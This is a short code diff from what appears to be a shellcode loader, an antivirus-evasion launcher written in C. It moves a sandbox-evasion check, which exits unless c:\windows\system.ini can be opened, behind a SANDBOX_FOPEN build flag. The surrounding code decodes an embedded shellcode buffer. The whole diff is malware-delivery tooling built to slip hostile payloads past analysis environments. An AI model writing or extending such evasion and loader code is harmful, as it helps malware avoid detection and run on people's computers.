@@ -52,16 +52,24 @@ int main (int argc, char **argv)
 
 	opterr = 0;
 
-#ifdef LVALUE
-fvalue=argv[1];
-#endif
+	// do evading here
+	#ifdef SANDBOX_FOPEN
+		FILE *fp = fopen("c:\\windows\\system.ini", "rb");
+		if (fp == NULL)
+			return 0;
+		fclose(fp);
+	#endif
 
-#ifdef PRINT_DEBUG
+	#ifdef LVALUE
+		fvalue=argv[1];
+	#endif
+
+	#ifdef PRINT_DEBUG
 		printf ("fvalue = %s ", fvalue);
 		printf ("uvalue = %s ", uvalue);
 		for (index = optind; index < argc; index++)
 			printf ("Non-option argument %s\n", argv[index]);
-#endif
+	#endif
 
 // compute #defines from defs.h
 #ifdef FVALUE
@@ -94,12 +102,6 @@ fvalue=argv[1];
 #ifdef FVALUE
 		size = strlen (FVALUE);
 		buffer = FVALUE;
-
-		// do evading here
-		FILE *fp = fopen("c:\\windows\\system.ini", "rb");
-		if (fp == NULL)
-			return 0;
-		fclose(fp);
 #endif
 
 		shellcode = decode_shellcode(buffer,shellcode,size);
